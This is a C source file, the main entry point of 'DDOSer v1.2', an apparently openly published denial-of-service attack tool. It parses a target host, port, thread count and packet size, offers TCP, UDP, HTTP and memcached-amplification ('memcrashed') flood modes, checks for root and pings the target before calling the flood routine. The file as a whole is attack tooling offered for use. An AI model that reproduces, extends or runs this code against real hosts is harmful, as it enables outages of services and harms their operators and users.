//
//  main.c
//  cdos
//
//  Created by Andre Zay on 17.12.2017.
//  Copyright © 2017 Andre Zay. All rights reserved.
//

#ifdef WIN32
#error This program is not compitable with Windows platform
#endif


#include <stdbool.h>
#include <time.h>
#include <stdint.h>

#include "ddos.h"
#include "message.h"
#include "socket.h"
#include "ping.h"
#include "memcrashed.h"
#include "packet.h"


bool socket_wait;

int main(int argc, const char* argv[])
{
    socket_wait = true;
    hide_warnings = false;
    srand(time(NULL));
    if(!checklarg("--hide-logo", argv, argc)){
        printf("█████╗  █████╗  ╔██████╗ ███████╗███████╗██████╗\n");
        printf("██╔══██╗██╔══██╗██╔═══██╗██╔════╝██╔════╝██╔══██╗\n");
        printf("██║  ██║██║  ██║██║   ██║███████╗█████╗  ██████╔╝\n");
        printf("██║  ██║██║  ██║██║   ██║╚════██║██╔══╝  ██╔══██╗\n");
        printf("██████╔╝██████╔╝╚██████╔╝███████║███████╗██║  ██║\n");
        printf("╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝\n");
        printf("                                             v1.2-early-prealpha\n");
    }
    info("DDOSer v1.2 by Andrewerr(https://github.com/Andrewerr)");
#ifdef DEBUG
    info("Starting in DEBUG mode");
#endif
    if (argc < 3 || checkarg("-h", argv, argc)) {
        info("Usage:%s -[h] <HOST> <PORT> -[r] -t <THREAD COUNT> -s <PACKET SIZE> [--http --no-warnings --no-check --no-wait --no-status --packetfile <FILENAME> --memcrashed --ipfile <FILENAME>]", argv[0]);
        return 0;
    }
    const char* _host = argv[1];
    char* host = (char*)malloc(sizeof(char) * 14);
    info("Starting up");
    if (hostname2ip(_host, host)) {
        error("Failed to resolve host:%s", _host);
#ifdef DEBUG
        error("DEBUG:hostname2ip(%s,%s)->%d,host=%s", _host, host, hostname2ip(_host, host), host);
#endif
        return -1;
    }
    use_dos_sleep=checklarg("--sleep",argv,argc);
    status=!checklarg("--no-status", argv, argc);
    if(use_dos_sleep){
        const char* RAW_SLEEP=getlarg("--sleep",argv,argc);
        dos_sleep=atoi(RAW_SLEEP);
    }
    if(dos_sleep<0){
        die("Invalid sleep argument");
    }
    int port = atoi(argv[2]);
    if (port < 0) {
        error("Bad port supplied!");
        return -1;
    }
    hide_warnings = checklarg("--no-warnings", argv, argc);
    hide_errors = checklarg("--no-errors", argv, argc);
    bool RANDOM_PACKET = checkarg("-r", argv, argc);
    int THREAD_COUNT = 5;
    size_t PACKET_SIZE = 4096;
    bool USE_HTTP = checklarg("--http", argv, argc);
    if (checkarg("-s", argv, argc)) {
        const char* raw_packetsize = getarg("-s", argv, argc);
        PACKET_SIZE = atoi(raw_packetsize);
    }
    if (checkarg("-t", argv, argc)) {
        const char* raw_threadcount = getarg("-t", argv, argc);
        THREAD_COUNT = atoi(raw_threadcount);
#ifdef DEBUG
        info("THREAD_COUNT=%d<-%s", THREAD_COUNT, raw_threadcount);
#endif
    }
    char* packet = NULL;
    if (PACKET_SIZE <= 0) {
        error("Bad packet size!");
        return -1;
    }
    
    if (!USE_HTTP) {
#ifdef DEBUG
        info("Using random tcp packet");
#endif
        packet = randstring(PACKET_SIZE);
    } else {
        packet = (char*)malloc(sizeof(char) * 35);
        packet = "HTTP/1.1 GET /\r\nConnection:keep-alive\r\n\r\n";
    }
    if (THREAD_COUNT <= 0) {
        error("Bad thread count!");
        return -1;
    }

    int PROTOCOL = MODE_EMPTY;
    if (checkarg("-u", argv, argc)) {
        PROTOCOL = MODE_UDP;
    }
    if (checklarg("--packetfile", argv, argc)) {
        packet = readfile(getlarg("--packetfile", argv, argc));
        if (packet == 0) {
            error("Failed to read packet file!");
            error("Exiting!");
            return -1;
        }
        PACKET_SIZE = strlen(packet);
    }
    metrics=SIZE_MB;
    if(checklarg("--metrics", argv, argc)){
#ifdef DEBUG
        info("Metrics_raw=%s",getlarg("--metrics", argv, argc));
#endif
        metrics=str2metrics(getlarg("--metrics", argv, argc));
        if(metrics==255){
            die("Bad metrics argument");
        }
    }
    hide_warnings = checklarg("--no-warnings", argv, argc);
    bool check = !checklarg("--no-check", argv, argc);
    socket_wait = !checklarg("--no-wait", argv, argc);
    /*memcrashed argument checker*/
    if(checklarg("--memcrashed", argv, argc)){
        const char * hostfile=sgetlarg("--ipfile", argv, argc, "ipfile");
#ifdef MEMCRASHED_INCLUDED
	memcrashed_init(hostfile);
#else 
	die("Memcrashed is not included in this build");
#endif
        if(PROTOCOL!=MODE_EMPTY){
            die("You have set incompitiable attack modes");
        }
        PROTOCOL=MODE_MEMCRASHED;
        if(!is_root()){
            die("Root privillegies required to perform attack");
        }
        if(USE_HTTP||socket_wait){
            warning("Some options you set is incompitiable with memcrashed attack PoC");
        }
    }
    //Checking whether host online
    if (check) {
        if(is_root()){
            int PING_MAX_TRIES=atoi(sgetlarg("--ping-max-tries", argv, argc, "5"));
            int PING_TIMEOUT=atoi(sgetlarg("--ping-timeout", argv, argc, "2"));
            if(!ping(host,PING_MAX_TRIES,PING_TIMEOUT)){
                die("Host is down.If it just blocking ping packets try running with --no-check option");
            }
        }else{
            warning("To perfom ping check root privilliges required.Add --no-check option to silence this warning or run with root to perform ping check");
        }
    }
    if(PROTOCOL==MODE_EMPTY){
#ifdef DEBUG
        info("Automatically set mode to TCP");
#endif
        PROTOCOL=MODE_TCP;
    }
#ifdef DEBUG
    info("Configuration:");
    info("HIDE_WARNINGS=%d", hide_warnings);
    info("HIDE ERRORS=%d",hide_errors);
    info("RANDOM_PACKET=%d", RANDOM_PACKET);
    info("THREAD_COUNT=%d", THREAD_COUNT);
    info("PACKET_SIZE=%d", PACKET_SIZE);
    info("MODE=%d", PROTOCOL);
    info("USE_HTTP=%d", USE_HTTP);
    info("STATUS=%d",status);
    info("METRICS_TYPE=%d",metrics);
    info("METRICS_STR=%s",metrics2str(metrics));
#endif

    ddos(host, port, packet, THREAD_COUNT, PROTOCOL);
    return 0;
}
